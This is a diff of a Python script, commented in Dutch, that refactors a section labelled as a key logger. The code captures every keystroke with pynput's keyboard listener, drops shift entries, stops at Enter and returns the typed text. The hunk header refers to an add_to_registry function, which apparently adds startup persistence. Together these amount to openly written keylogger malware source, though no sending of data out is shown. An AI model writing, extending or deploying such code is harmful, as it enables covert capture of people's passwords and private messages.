@@ -170,44 +170,36 @@ def add_to_registry(program_name):
 # key logger
 inputList = []
 
-def on_press(key):
+def log_a_string(key):
     global inputList
 
     try:
+        # de logger stoppen als enter geklikt wordt
         if key == keyboard.Key.enter:
-            remove_shift(inputList)
+            # delete Key.shift uit de list, als het voorkomt in de list
+            for item in inputList:
+                if item == 'Key.shift':
+                    inputList.remove(item)
             return False
         
+        # spatie toevoegen als het gebruikt wordt
         if key == key.space:
             inputList.append(" ")
         
+        # voor letters en cijfers
         else:
-            # print('alphanumeric key {0} pressed'.format(key.char))
             inputList.append(format(key.char))
 
+    # als het tekens zijn
     except AttributeError:
-        # print('special key {0} pressed'.format(key))
         inputList.append(format(key))
-    
-    # return string
-
-
-def remove_shift(list):
-    for item in list:
-        if item == 'Key.shift':
-            list.remove(item)
-    return list
-
 
 def key_log():
     # Collect events until released
-    with keyboard.Listener(on_press=on_press) as listener: listener.join()
+    with keyboard.Listener(on_press=log_a_string) as listener:
+        listener.join()
+    
+    # return een list zonder aanhalings tekens
+    return ''.join(inputList).replace("'", "")
 
-    # ...or, in a non-blocking fashion:
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
-
-key_log()
-a = ''.join(inputList).replace("'", "")
-
-print(a)
+print(key_log())
